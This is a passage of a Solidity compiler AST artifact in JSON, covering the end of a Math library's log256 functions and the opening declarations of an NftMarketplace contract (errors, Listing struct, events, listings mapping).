0"},"value":"0"},"src":"11886:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2531,"nodeType":"IfStatement","src":"11882:95:10","trueBody":{"id":2530,"nodeType":"Block","src":"11903:74:10","statements":[{"expression":{"id":2524,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2522,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11921:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3136","id":2523,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11931:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"11921:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2525,"nodeType":"ExpressionStatement","src":"11921:12:10"},{"expression":{"id":2528,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2526,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"11951:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"32","id":2527,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11961:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"11951:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2529,"nodeType":"ExpressionStatement","src":"11951:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2536,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2534,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2532,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11994:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"38","id":2533,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12003:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"11994:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2535,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12007:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"11994:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2542,"nodeType":"IfStatement","src":"11990:64:10","trueBody":{"id":2541,"nodeType":"Block","src":"12010:44:10","statements":[{"expression":{"id":2539,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2537,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"12028:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":2538,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12038:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"12028:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2540,"nodeType":"ExpressionStatement","src":"12028:11:10"}]}}]},{"expression":{"id":2544,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"12080:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2467,"id":2545,"nodeType":"Return","src":"12073:13:10"}]},"documentation":{"id":2461,"nodeType":"StructuredDocumentation","src":"11185:240:10","text":" @dev Return the log in base 256, rounded down, of a positive value.\n Returns 0 if given 0.\n Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string."},"id":2547,"implemented":true,"kind":"function","modifiers":[],"name":"log256","nameLocation":"11439:6:10","nodeType":"FunctionDefinition","parameters":{"id":2464,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2463,"mutability":"mutable","name":"value","nameLocation":"11454:5:10","nodeType":"VariableDeclaration","scope":2547,"src":"11446:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2462,"name":"uint256","nodeType":"ElementaryTypeName","src":"11446:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11445:15:10"},"returnParameters":{"id":2467,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2466,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2547,"src":"11484:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2465,"name":"uint256","nodeType":"ElementaryTypeName","src":"11484:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11483:9:10"},"scope":2587,"src":"11430:663:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2585,"nodeType":"Block","src":"12329:173:10","statements":[{"id":2584,"nodeType":"UncheckedBlock","src":"12339:157:10","statements":[{"assignments":[2559],"declarations":[{"constant":false,"id":2559,"mutability":"mutable","name":"result","nameLocation":"12371:6:10","nodeType":"VariableDeclaration","scope":2584,"src":"12363:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2558,"name":"uint256","nodeType":"ElementaryTypeName","src":"12363:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2563,"initialValue":{"arguments":[{"id":2561,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2550,"src":"12387:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2560,"name":"log256","nodeType":"Identifier","overloadedDeclarations":[2547,2586],"referencedDeclaration":2547,"src":"12380:6:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":2562,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"12380:13:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"12363:30:10"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2582,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2564,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2559,"src":"12414:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"components":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":2577,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"id":2568,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2565,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2553,"src":"12424:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":2566,"name":"Rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1729,"src":"12436:8:10","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_Rounding_$1729_$","typeString":"type(enum Math.Rounding)"}},"id":2567,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"Up","nodeType":"MemberAccess","referencedDeclaration":1727,"src":"12436:11:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"src":"12424:23:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2576,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2574,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":2569,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12451:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2572,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2570,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2559,"src":"12457:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"hexValue":"38","id":2571,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12466:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"12457:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2573,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"12456:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"12451:17:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":2575,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2550,"src":"12471:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"12451:25:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"12424:52:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"30","id":2579,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12483:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"id":2580,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"12424:60:10","trueExpression":{"hexValue":"31","id":2578,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12479:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"id":2581,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"12423:62:10","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"12414:71:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2557,"id":2583,"nodeType":"Return","src":"12407:78:10"}]}]},"documentation":{"id":2548,"nodeType":"StructuredDocumentation","src":"12099:143:10","text":" @dev Return the log in base 10, following the selected rounding direction, of a positive value.\n Returns 0 if given 0."},"id":2586,"implemented":true,"kind":"function","modifiers":[],"name":"log256","nameLocation":"12256:6:10","nodeType":"FunctionDefinition","parameters":{"id":2554,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2550,"mutability":"mutable","name":"value","nameLocation":"12271:5:10","nodeType":"VariableDeclaration","scope":2586,"src":"12263:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2549,"name":"uint256","nodeType":"ElementaryTypeName","src":"12263:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2553,"mutability":"mutable","name":"rounding","nameLocation":"12287:8:10","nodeType":"VariableDeclaration","scope":2586,"src":"12278:17:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"typeName":{"id":2552,"nodeType":"UserDefinedTypeName","pathNode":{"id":2551,"name":"Rounding","nodeType":"IdentifierPath","referencedDeclaration":1729,"src":"12278:8:10"},"referencedDeclaration":1729,"src":"12278:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"12262:34:10"},"returnParameters":{"id":2557,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2556,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2586,"src":"12320:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2555,"name":"uint256","nodeType":"ElementaryTypeName","src":"12320:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12319:9:10"},"scope":2587,"src":"12247:255:10","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":2588,"src":"202:12302:10","usedErrors":[]}],"src":"103:12402:10"},"id":10},"contracts/NftMarketplace.sol":{"ast":{"absolutePath":"contracts/NftMarketplace.sol","exportedSymbols":{"AlreadyListed":[2617],"IERC165":[1722],"IERC721":[1114],"ItemNotForSale":[2605],"NftMarketplace":[3055],"NoProceeds":[2619],"NotApprovedForMarketplace":[2623],"NotListed":[2611],"NotOwner":[2621],"PriceMustBeAboveZero":[2625],"PriceNotMet":[2599],"ReentrancyGuard":[53]},"id":3056,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":2589,"literals":["solidity","^","0.8",".7"],"nodeType":"PragmaDirective","src":"32:23:11"},{"absolutePath":"@openzeppelin/contracts/token/ERC721/IERC721.sol","file":"@openzeppelin/contracts/token/ERC721/IERC721.sol","id":2590,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":3056,"sourceUnit":1115,"src":"56:58:11","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/security/ReentrancyGuard.sol","file":"@openzeppelin/contracts/security/ReentrancyGuard.sol","id":2591,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":3056,"sourceUnit":54,"src":"115:62:11","symbolAliases":[],"unitAlias":""},{"id":2599,"name":"PriceNotMet","nameLocation":"185:11:11","nodeType":"ErrorDefinition","parameters":{"id":2598,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2593,"mutability":"mutable","name":"nftAddress","nameLocation":"205:10:11","nodeType":"VariableDeclaration","scope":2599,"src":"197:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2592,"name":"address","nodeType":"ElementaryTypeName","src":"197:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2595,"mutability":"mutable","name":"tokenId","nameLocation":"225:7:11","nodeType":"VariableDeclaration","scope":2599,"src":"217:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2594,"name":"uint256","nodeType":"ElementaryTypeName","src":"217:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2597,"mutability":"mutable","name":"price","nameLocation":"242:5:11","nodeType":"VariableDeclaration","scope":2599,"src":"234:13:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2596,"name":"uint256","nodeType":"ElementaryTypeName","src":"234:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"196:52:11"},"src":"179:70:11"},{"id":2605,"name":"ItemNotForSale","nameLocation":"256:14:11","nodeType":"ErrorDefinition","parameters":{"id":2604,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2601,"mutability":"mutable","name":"nftAddress","nameLocation":"279:10:11","nodeType":"VariableDeclaration","scope":2605,"src":"271:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2600,"name":"address","nodeType":"ElementaryTypeName","src":"271:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2603,"mutability":"mutable","name":"tokenId","nameLocation":"299:7:11","nodeType":"VariableDeclaration","scope":2605,"src":"291:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2602,"name":"uint256","nodeType":"ElementaryTypeName","src":"291:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"270:37:11"},"src":"250:58:11"},{"id":2611,"name":"NotListed","nameLocation":"315:9:11","nodeType":"ErrorDefinition","parameters":{"id":2610,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2607,"mutability":"mutable","name":"nftAddress","nameLocation":"333:10:11","nodeType":"VariableDeclaration","scope":2611,"src":"325:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2606,"name":"address","nodeType":"ElementaryTypeName","src":"325:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2609,"mutability":"mutable","name":"tokenId","nameLocation":"353:7:11","nodeType":"VariableDeclaration","scope":2611,"src":"345:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2608,"name":"uint256","nodeType":"ElementaryTypeName","src":"345:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"324:37:11"},"src":"309:53:11"},{"id":2617,"name":"AlreadyListed","nameLocation":"369:13:11","nodeType":"ErrorDefinition","parameters":{"id":2616,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2613,"mutability":"mutable","name":"nftAddress","nameLocation":"391:10:11","nodeType":"VariableDeclaration","scope":2617,"src":"383:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2612,"name":"address","nodeType":"ElementaryTypeName","src":"383:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2615,"mutability":"mutable","name":"tokenId","nameLocation":"411:7:11","nodeType":"VariableDeclaration","scope":2617,"src":"403:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2614,"name":"uint256","nodeType":"ElementaryTypeName","src":"403:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"382:37:11"},"src":"363:57:11"},{"id":2619,"name":"NoProceeds","nameLocation":"427:10:11","nodeType":"ErrorDefinition","parameters":{"id":2618,"nodeType":"ParameterList","parameters":[],"src":"437:2:11"},"src":"421:19:11"},{"id":2621,"name":"NotOwner","nameLocation":"447:8:11","nodeType":"ErrorDefinition","parameters":{"id":2620,"nodeType":"ParameterList","parameters":[],"src":"455:2:11"},"src":"441:17:11"},{"id":2623,"name":"NotApprovedForMarketplace","nameLocation":"465:25:11","nodeType":"ErrorDefinition","parameters":{"id":2622,"nodeType":"ParameterList","parameters":[],"src":"490:2:11"},"src":"459:34:11"},{"id":2625,"name":"PriceMustBeAboveZero","nameLocation":"500:20:11","nodeType":"ErrorDefinition","parameters":{"id":2624,"nodeType":"ParameterList","parameters":[],"src":"520:2:11"},"src":"494:29:11"},{"abstract":false,"baseContracts":[{"baseName":{"id":2626,"name":"ReentrancyGuard","nodeType":"IdentifierPath","referencedDeclaration":53,"src":"552:15:11"},"id":2627,"nodeType":"InheritanceSpecifier","src":"552:15:11"}],"contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":3055,"linearizedBaseContracts":[3055,53],"name":"NftMarketplace","nameLocation":"534:14:11","nodeType":"ContractDefinition","nodes":[{"canonicalName":"NftMarketplace.Listing","id":2632,"members":[{"constant":false,"id":2629,"mutability":"mutable","name":"price","nameLocation":"607:5:11","nodeType":"VariableDeclaration","scope":2632,"src":"599:13:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2628,"name":"uint256","nodeType":"ElementaryTypeName","src":"599:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2631,"mutability":"mutable","name":"seller","nameLocation":"630:6:11","nodeType":"VariableDeclaration","scope":2632,"src":"622:14:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2630,"name":"address","nodeType":"ElementaryTypeName","src":"622:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"name":"Listing","nameLocation":"581:7:11","nodeType":"StructDefinition","scope":3055,"src":"574:69:11","visibility":"public"},{"anonymous":false,"id":2642,"name":"ItemListed","nameLocation":"654:10:11","nodeType":"EventDefinition","parameters":{"id":2641,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2634,"indexed":true,"mutability":"mutable","name":"seller","nameLocation":"690:6:11","nodeType":"VariableDeclaration","scope":2642,"src":"674:22:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2633,"name":"address","nodeType":"ElementaryTypeName","src":"674:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2636,"indexed":true,"mutability":"mutable","name":"nftAddress","nameLocation":"722:10:11","nodeType":"VariableDeclaration","scope":2642,"src":"706:26:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2635,"name":"address","nodeType":"ElementaryTypeName","src":"706:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2638,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"758:7:11","nodeType":"VariableDeclaration","scope":2642,"src":"742:23:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2637,"name":"uint256","nodeType":"ElementaryTypeName","src":"742:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2640,"indexed":false,"mutability":"mutable","name":"price","nameLocation":"783:5:11","nodeType":"VariableDeclaration","scope":2642,"src":"775:13:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2639,"name":"uint256","nodeType":"ElementaryTypeName","src":"775:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"664:130:11"},"src":"648:147:11"},{"anonymous":false,"id":2650,"name":"ItemCanceled","nameLocation":"806:12:11","nodeType":"EventDefinition","parameters":{"id":2649,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2644,"indexed":true,"mutability":"mutable","name":"seller","nameLocation":"844:6:11","nodeType":"VariableDeclaration","scope":2650,"src":"828:22:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2643,"name":"address","nodeType":"ElementaryTypeName","src":"828:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2646,"indexed":true,"mutability":"mutable","name":"nftAddress","nameLocation":"876:10:11","nodeType":"VariableDeclaration","scope":2650,"src":"860:26:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2645,"name":"address","nodeType":"ElementaryTypeName","src":"860:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2648,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"912:7:11","nodeType":"VariableDeclaration","scope":2650,"src":"896:23:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2647,"name":"uint256","nodeType":"ElementaryTypeName","src":"896:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"818:107:11"},"src":"800:126:11"},{"anonymous":false,"id":2660,"name":"ItemBought","nameLocation":"937:10:11","nodeType":"EventDefinition","parameters":{"id":2659,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2652,"indexed":true,"mutability":"mutable","name":"seller","nameLocation":"973:6:11","nodeType":"VariableDeclaration","scope":2660,"src":"957:22:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2651,"name":"address","nodeType":"ElementaryTypeName","src":"957:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2654,"indexed":true,"mutability":"mutable","name":"nftAddress","nameLocation":"1005:10:11","nodeType":"VariableDeclaration","scope":2660,"src":"989:26:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2653,"name":"address","nodeType":"ElementaryTypeName","src":"989:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2656,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"1041:7:11","nodeType":"VariableDeclaration","scope":2660,"src":"1025:23:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2655,"name":"uint256","nodeType":"ElementaryTypeName","src":"1025:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2658,"indexed":false,"mutability":"mutable","name":"price","nameLocation":"1066:5:11","nodeType":"VariableDeclaration","scope":2660,"src":"1058:13:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2657,"name":"uint256","nodeType":"ElementaryTypeName","src":"1058:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"947:130:11"},"src":"931:147:11"},{"constant":false,"id":2667,"mutability":"mutable","name":"s_listings","nameLocation":"1139:10:11","nodeType":"VariableDeclaration","scope":3055,"src":"1083:66:11","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing))"},"typeName":{"id":2666,"keyType":{"id":2661,"name":"address","nodeType":"ElementaryTypeName","src":"1091:7:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1083:47:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing))"},"valueType":{"id":2665,"keyType":{"id":2662,"name":"uint256","nodeType":"ElementaryTypeName","src":"1110:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Mapping","src":"1102:27:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing)"},"valueType":{"id":2664,"nodeType":"UserDefinedTypeName","pathNode":{"id":2663,"name":"Listing","nodeType":"IdentifierPath","referencedDeclaration":2632,"src":"1121:7:11"},"referencedDeclaration":2632,"src":"1121:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage_ptr","typeString":"struct 